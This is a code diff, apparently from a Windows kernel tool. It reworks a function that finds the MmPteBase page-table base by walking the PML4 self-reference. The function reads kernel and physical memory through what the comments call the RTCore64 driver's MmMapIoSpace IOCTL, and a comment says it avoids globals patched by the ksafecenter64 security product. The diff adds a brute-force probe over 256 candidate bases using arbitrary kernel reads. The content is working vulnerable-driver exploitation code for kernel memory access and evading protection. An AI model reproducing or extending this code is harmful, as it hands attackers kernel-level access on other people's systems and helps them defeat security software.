@@ -297,7 +297,12 @@ static DWORD64 FindMmPfnDatabaseByPattern(const NtoskrnlImage& img) {
 // MmPteBase = 0xFFFF000000000000 | (self_ref_index << 39).
 //
 // This is completely independent of ntoskrnl globals that ksafecenter64 patches.
-// Safe: MapPhys reads physical RAM, no virtual address guessing, no BSOD risk.
+// Two paths:
+//   Path A: MapPhys → read physical PML4 directly (fastest, may fail on low PA)
+//   Path B: Self-map brute-force → try all 256 candidate MmPteBase values and
+//           read through the PTE self-map using Rd64 (no MapPhys needed).
+//           Write and map are two sides of the same coin — the PML4 page IS
+//           already mapped somewhere in the self-map, we just need to find where.
 static DWORD64 FindMmPteBaseByCR3Walk() {
     // 1. System EPROCESS via PsInitialSystemProcess export
     DWORD64 sysEP = g_drv->Rd64(KUtil::KernelExport("PsInitialSystemProcess"));
@@ -316,37 +321,89 @@ static DWORD64 FindMmPteBaseByCR3Walk() {
     // Clear low 12 bits (PCID, flags) to get raw PML4 physical address
     DWORD64 pml4_pa = cr3 & 0x000FFFFFFFFFF000ULL;
 
-    // 3. Map PML4 physical page via RTCore64 MmMapIoSpace IOCTL
+    // ── Path A: MapPhys (direct physical read) ──────────────────────────────
     DWORD64 pml4_va = g_drv->MapPhys(pml4_pa, 4096);
-    if (!pml4_va) {
-        if (g_debug)
-            printf("[pte] PML4Walk: MapPhys(PA=0x%012llX) failed\n", pml4_pa);
-        return 0;
+    if (pml4_va) {
+        DWORD64 result = 0;
+        for (int i = 256; i < 512; i++) {
+            DWORD64 entry    = g_drv->Rd64(pml4_va + (DWORD64)i * 8);
+            DWORD64 entry_pa = entry & 0x000FFFFFFFFFF000ULL;
+            if (!entry_pa) continue;
+            if (entry_pa == pml4_pa) {
+                result = 0xFFFF000000000000ULL | ((DWORD64)i << 39);
+                printf("[pte] PML4Walk(MapPhys): self-ref at PML4[%d=0x%X]  CR3=0x%llX  MmPteBase=0x%016llX\n",
+                       i, i, cr3, result);
+                break;
+            }
+        }
+        g_drv->UnmapPhys(pml4_va, 4096);
+        if (result) return result;
     }
 
-    // 4. Scan PML4 entries [256..511] for self-reference
-    //    Each entry: bits[51:12] = physical page number of next-level table.
-    //    Self-ref: entry's PA == PML4's own PA.
-    DWORD64 result = 0;
+    // ── Path B: Self-map probe via known mapped VA ────────────────────────
+    // MapPhys failed (low PA range). Instead of blind brute-force (which can
+    // BSOD by reading unmapped VAs), use ntoskrnl base as a known-good probe:
+    //
+    // ntoskrnl is always mapped. For each candidate MmPteBase, compute
+    // PteVaOf(ntoskrnl_base) and read it. If the result looks like a valid
+    // PTE (Present bit set, PA != 0), we have a PteBase candidate.
+    // Then verify by computing the PML4 self-ref entry and checking PA == CR3.
+    //
+    // This is safe: PteVaOf(ntoskrnl) for the CORRECT MmPteBase always points
+    // to a valid self-map entry. For wrong candidates, PteVaOf gives a VA
+    // inside ntoskrnl's own address range (which IS mapped), so Rd64 won't fault.
+    if (g_debug)
+        printf("[pte] PML4Walk: MapPhys failed for PA=0x%012llX, trying known-VA probe\n", pml4_pa);
+
+    // Get ntoskrnl base (always mapped, present, executable)
+    LPVOID drvs[1]; DWORD cbNeeded;
+    if (!EnumDeviceDrivers(drvs, sizeof(drvs), &cbNeeded) || !drvs[0]) {
+        printf("[pte] PML4Walk: cannot get ntoskrnl base\n");
+        return 0;
+    }
+    DWORD64 ntBase = (DWORD64)drvs[0];
+
     for (int i = 256; i < 512; i++) {
-        DWORD64 entry    = g_drv->Rd64(pml4_va + (DWORD64)i * 8);
-        DWORD64 entry_pa = entry & 0x000FFFFFFFFFF000ULL;
-        if (!entry_pa) continue;    // not present or not mapped
-        if (entry_pa == pml4_pa) {
-            // Self-reference at PML4[i] → MmPteBase = sign_extended(i << 39)
-            result = 0xFFFF000000000000ULL | ((DWORD64)i << 39);
-            printf("[pte] PML4Walk: self-ref at PML4[%d=0x%X]  CR3=0x%llX  MmPteBase=0x%016llX\n",
-                   i, i, cr3, result);
-            break;
+        DWORD64 cand = 0xFFFF000000000000ULL | ((DWORD64)i << 39);
+
+        // Compute PTE VA for ntoskrnl base using this candidate
+        DWORD64 pteVA = cand + ((ntBase & 0x0000FFFFFFFFF000ULL) >> 9);
+
+        // Basic sanity: must be kernel VA and QWORD-aligned
+        if (!g_drv->IsKernelVA(pteVA) || (pteVA & 7)) continue;
+
+        // Read candidate PTE — safe because pteVA for the correct candidate
+        // IS in the self-map (always valid). For wrong candidates, the VA
+        // typically falls in mapped kernel regions (won't fault), but content
+        // won't look like a valid PTE.
+        DWORD64 pteVal = g_drv->Rd64(pteVA);
+
+        // Valid PTE: Present bit set, PA field nonzero, not NX-only
+        if (!(pteVal & 1)) continue;                    // not present
+        DWORD64 pa = pteVal & 0x000FFFFFFFFFF000ULL;
+        if (!pa) continue;                               // no physical address
+
+        // Promising candidate. Now verify: walk 4 levels of self-map to reach
+        // the PML4 entry, check if its PA matches CR3 (self-reference).
+        DWORD64 lvl = pteVA;
+        for (int depth = 0; depth < 3; depth++)  // 3 more levels: PDE, PDPTE, PML4E
+            lvl = cand + ((lvl & 0x0000FFFFFFFFF000ULL) >> 9);
+
+        if (!g_drv->IsKernelVA(lvl) || (lvl & 7)) continue;
+
+        DWORD64 pml4e = g_drv->Rd64(lvl);
+        DWORD64 pml4e_pa = pml4e & 0x000FFFFFFFFFF000ULL;
+
+        if (pml4e_pa == pml4_pa && (pml4e & 1)) {
+            printf("[pte] PML4Walk(probe): verified at PML4[%d=0x%X]  CR3=0x%llX  "
+                   "MmPteBase=0x%016llX  (no MapPhys needed)\n",
+                   i, i, cr3, cand);
+            return cand;
         }
     }
 
-    // 5. Unmap physical page
-    g_drv->UnmapPhys(pml4_va, 4096);
-
-    if (!result)
-        printf("[pte] PML4Walk: no self-reference found in PML4[256..511]\n");
-    return result;
+    printf("[pte] PML4Walk: both MapPhys and known-VA probe failed\n");
+    return 0;
 }
 
 // ── Method 0b: CR3 physical walk via MmPfnDatabase ───────────────────────────
